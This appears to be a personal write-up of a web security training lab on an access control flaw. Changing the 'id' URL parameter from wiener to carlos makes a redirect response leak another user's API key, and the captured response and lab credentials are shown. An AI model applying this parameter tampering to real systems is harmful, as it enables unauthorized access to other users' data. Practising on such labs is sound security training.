## User ID controlled by request parameter with data leakage in redirect

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- /login

## Resume

1. Login with wiener:peter
2. Update the `id=wiener` on profil page
3. Check the redirect response
3. Get Carlos's API key


## Solve 

Login with wiener:peter and access to the **My account** page. Update the parameter in the url : 

`/my-account?id=wiener` to `/my-account?id=carlos`

Check the request that redirect to the **login** page : 

```
HTTP/2 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3759

                   <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: carlos</p>
                        <div>Your API Key is: XnneiDsuLsUp1W1zPQ8cMcwP9MIeRkwo</div><br/>
```
